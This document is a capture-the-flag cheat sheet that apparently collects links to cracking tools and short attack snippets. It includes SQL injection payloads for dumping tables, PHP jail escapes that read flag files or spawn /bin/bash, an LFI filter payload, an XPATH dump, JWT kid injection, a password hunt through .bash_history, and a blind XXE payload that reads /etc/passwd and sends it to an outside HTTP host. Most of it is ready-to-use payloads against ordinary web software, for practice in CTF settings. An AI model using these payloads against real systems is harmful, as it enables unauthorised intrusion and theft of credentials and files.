# Notes

### Crack Android lockscreen from system files (gesture.key)
```
https://github.com/KieronCraggs/GestureCrack
```

### XOR Analysis
```
https://github.com/hellman/xortool
```

### Cryptanalysis 
```
https://github.com/nccgroup/featherduster
```

### RSA Cracking Tools
```
https://github.com/Ganapati/RsaCtfTool
https://github.com/ius/rsatool
```


### Morse Code Audio Decode
```
https://morsecode.world/international/decoder/audio-decoder-adaptive.html
```

### Text to 21 Common Ciphers
```
https://v2.cryptii.com/text/select
```
 

### Crypto Example Challs
```
https://asecuritysite.com/encryption/ctf?mybutton=
```


### Shift in Python


```python
with open('FILENAME') as f:
    msg = f.read()
    for x in range(256):
        print ''.join([chr((ord(y) + x) % 256) for y in msg])
```

### Predict encoding type
```
https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')
```

### Get data, process and respond over a socket
```python
import socket
import re


clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect(('IP', PORT))
data = clientsocket.recv(1024)
print data
result = re.sub('[^0-9]', '', data) #Retrieve the digits (or numbers) only from input
print result
clientsocket.send(str(result))
data = clientsocket.recv(1024)
print data

```



### Extract domain names & hosts from PCAP
*Domain Names*
```
tshark -r *PCAP* -Y 'dns' -T fields -e dns.qry.name | sort -u > dns.txt
```
*Hosts*
```
tshark -r *PCAP* -Y 'tls.handshake.extensions_server_name' -T fields -e tls.handshake.extensions_server_name | sort -u > hosts.txt
```


### Manual UNION SQLite Injection
*Table*
```sql
1' union all select 1,tbl_name,3 FROM sqlite_master WHERE type='table' limit 0,1 --
```
*Columns (as command)*
```sql
1' union all select 1,sql,3 FROM sqlite_master WHERE type='table' and tbl_name='nameoftable' limit 0,1 -- 
```
*Values (payload depends on the columns structure)*
```sql
1' union all select 1,"nameofcolumn",3 FROM "nameoftable" limit 2,1 --
```

### SQL Injection Little Tips
```-- ``` -> Linux <br>
```--+``` -> Windows <br>
```%23 (#)``` -> Hash <br>
``` %2527 (')``` -> bypass urldecode(urldecode(htmlspecialchars(, ENT_QUOTES)));


### Manual UNION SQL Injection
*Table*
```sql
1' union select (select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),2#
```
*Columns*
```sql
1' union select (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='nameoftable'),2#
```
*Values*
```sql
1' union select (select nameofcolumn from nameoftable limit 0,1),2#
```
*Using Newline*
```sql
admin %0A union %0A select %0A 1,database()#
           or
admin %0A union %0A select %0A database(),2#   
```
*Bypass preg_replace*
```sql
ununionion select 1,2%23
     or
UNunionION SEselectLECT 1,2,3%23
```


### Known Plaintext ZIP
*Download pkcrack*
```
https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack/download1.html

! Before using, it must be built from source
```

*Syntax*
```
./pkcrack -C encrypted.zip -c file -P plaintext.zip -p file
```




### Python Functions
Files: https://www.w3schools.com/python/python_ref_file.asp <br>
Strings: https://www.w3schools.com/python/python_ref_string.asp <br>
Keyworks: https://www.w3schools.com/python/python_ref_keywords.asp <br>
Random: https://www.w3schools.com/python/module_random.asp <br>




### PHP Functions

Files: https://www.w3schools.com/php/php_ref_filesystem.asp <br>
Directories: https://www.w3schools.com/php/php_ref_directory.asp <br>
Errors: https://www.w3schools.com/php/php_ref_error.asp <br>
Network: https://www.w3schools.com/php/php_ref_network.asp <br>
Misc: https://www.w3schools.com/php/php_ref_misc.asp



### PHP Jail Escape
*With file_get_contents()*
```php
print file_get_contents('flag.txt');
```
*With readfile()*
```php
echo readfile("flag.txt");
```

*With popen()*
```php
popen("vi", "w");

:r flag.txt
   or
:!/bin/bash
```

*With highlight_file()*
```php
highlight_file(glob("flag.txt")[0]);
   or
highlight_file(glob("fl*txt")[0]);
```

*With highlight_source()*
```php
highlight_source("flag.txt");
   or
highlight_source(glob("*")[4]);
```

*With Finfo()*
```php
new Finfo(0,glob(hex2bin(hex2bin(3261)))[0]);
```

### XPATH Dump
```
https://example.com/accounts.php?user=test"]/../*%00&xpath_debug=1
```


### LFI Retrieve File without executing it
```
https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

### Useful PCAP Reader
```
chaosreader
```

### ZIP Format Signatures

*HEADER*
```
50 4B 03 04 14
```
*FOOTER*
```
50 4B 05 06 00
```


### JWT KID Value Exploitation
*Sign with public file from server*
```
kid: public/css/file.css

wget file.css from target

manipulate token using jwt_tool and sign it with file.css
```

*SQL Injection*
```
kid: test' UNION SELECT 'key';--

manipulate token using jwt_tool and sign it using the secret -> 'key'
```


### Blind XXE to SSRF

*ON TARGET*

```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "*HOST ADDRESS OF DTD FILE (preferably on github)*">
<foo>&e1;</foo>
````

*INSIDE DTD FILE*

```xml
<!ENTITY % p1 SYSTEM "file:///etc/passwd">
<!ENTITY % p2 "<!ENTITY e1 SYSTEM '*RANDOM HTTP HOST (like https://requestbin.com/)*/%p1;'>">
%p2;
```


### Hidden terminal input history
```bash
find . -name .bash_history -exec grep -A 1 '^passwd' {} \;
```

### Search file by name pattern
```bash
find -name "*PATTERN*" 2>/dev/null
```

### Search string
```bash
grep -r "STRING" / 2>/dev/null
```

### Check SUDO privileges/rights
```bash
sudo -l
```
